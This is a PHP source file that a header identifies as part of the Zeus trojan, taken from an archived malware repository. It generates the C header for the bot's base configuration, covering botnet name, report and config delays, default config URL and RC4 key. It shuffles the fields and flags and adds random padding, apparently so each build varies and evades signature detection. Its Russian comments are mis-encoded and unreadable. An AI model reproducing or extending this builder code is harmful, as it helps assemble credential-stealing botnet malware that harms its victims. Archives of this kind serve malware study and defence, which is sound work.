/*
  name      Zeus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
<?php
///////////////////////////////////////////////////////////////////////////////////////////////////
// ��������� ��������� BASECONFIG.
///////////////////////////////////////////////////////////////////////////////////////////////////  

/*  
  ��������� ��������� BASECONFIG.

  Return - ���������� h-�����.
*/
function generateBaseConfigHeader()
{
  $flags = array
  (
    "BCF_REMOVE_CERTS     ",  //������������� ������� �����������.
    "BCF_DISABLE_TCPSERVER",  //��������� TCP-������.

    //������ ��������� ����. �����, ��� ��� ������������ ������� �� ������� (�� ����� ���� ���� ������).
    "BCF_01               ",
    "BCF_02               ",
    "BCF_03               ",
    "BCF_04               ",
    "BCF_05               ",
    "BCF_06               ",
    "BCF_07               ",
    "BCF_08               ",
    "BCF_09               ",
    "BCF_10               ",
    "BCF_11               ",
    "BCF_12               ",
    "BCF_13               ",
    "BCF_14               ",
    "BCF_15               ",
    "BCF_16               ",
    "BCF_17               ",
    "BCF_18               ",
    "BCF_19               ",
    "BCF_20               ",
    "BCF_21               ",
    "BCF_22               ",
    "BCF_23               ",
    "BCF_24               ",
    "BCF_25               ",
    "BCF_26               ",
    "BCF_27               ",
    "BCF_28               ",
    "BCF_29               ",
    "BCF_30               ",
  );
  
  $vars = array
  (
    "DWORD flags;                               //����� BCF_*.",
    "WCHAR defaultBotnet[BOTNET_MAX_CHARS + 1]; //��� ������� �� ���������.",
    "DWORD delayConfig;                         //������ �������� ��� �������� ������������.",
    "DWORD delayReport;                         //������ �������� ��� �������� �������.",
    "DWORD delayStats;                          //������ �������� ��� �������� ����������.",
    "char  defaultConfig[100 + 1];              //URL ������������ �� ���������.",
    "Crypt::RC4KEY baseKey;                     //���� ���������� �������.",
  );

  //������������ ��������.
  shuffle($vars);
  shuffle($flags);

  //��������� �����.
  $outputEnum = array();
  $i = 0;
  foreach($flags as $v)
  {
    $outputEnum[] = sprintf("  {$v} = 0x%08X", (1 << $i));
    $i++;
  }
  
  //��������� ����� ������ ��������� ���������, ����������� ������.
  $outputStruct = '';
  $i = 0;
  $vars[] = 0; //��� ���������� �������� � �����.
  foreach($vars as $v)
  {
    if(($rnd = mt_rand(0, 100)) > 0)
    {
      $outputStruct .= "  BYTE  padding{$i}[{$rnd}];\r\n";
      $i++;
    }
    if(!empty($v))$outputStruct .= "  ".$v."\r\n";
  }

  //�������.
  return "enum\r\n{\r\n".implode(",\r\n", $outputEnum)."\r\n};\r\n\r\n".
         "typedef struct\r\n{\r\n{$outputStruct}}BASECONFIG;\r\n";
}
?>